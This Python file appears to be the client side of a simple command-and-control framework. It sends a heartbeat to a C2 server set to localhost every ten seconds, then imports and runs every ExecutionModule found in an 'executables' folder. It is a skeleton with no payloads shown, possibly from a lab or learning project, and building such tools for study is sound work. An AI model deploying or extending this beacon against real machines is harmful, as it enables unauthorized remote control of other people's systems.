import time
import requests
import inspect
from importlib import import_module
from pathlib import Path

from executables.base import ExecutionModule

C2_DOMAIN = "http://localhost:8000"
EXECUTABLES_DIR = "executables"


def execute_all_modules():
    exec_dir = Path(__file__).parent / EXECUTABLES_DIR
    print(exec_dir)

    # Get all Python files except __init__.py and the base module
    module_files = [
        f for f in exec_dir.glob("*.py") if f.stem not in ("__init__", "base")
    ]

    for module_file in module_files:
        # Import the file as a module
        module_name = f"{EXECUTABLES_DIR}.{module_file.stem}"
        module: ExecutionModule = import_module(module_name)  # type: ignore

        # Execute the executable within the module
        for _, obj in inspect.getmembers(module, inspect.isclass):
            if issubclass(obj, ExecutionModule):
                obj.execute()
                break


def main():
    while True:
        response = requests.post(url=C2_DOMAIN + "/heartbeat")

        if response.status_code == 200:
            print(response.json())
        else:
            print(response.content)

        execute_all_modules()

        time.sleep(10)


if __name__ == "__main__":
    try:
        main()
    finally:
        print("Shutting down...")
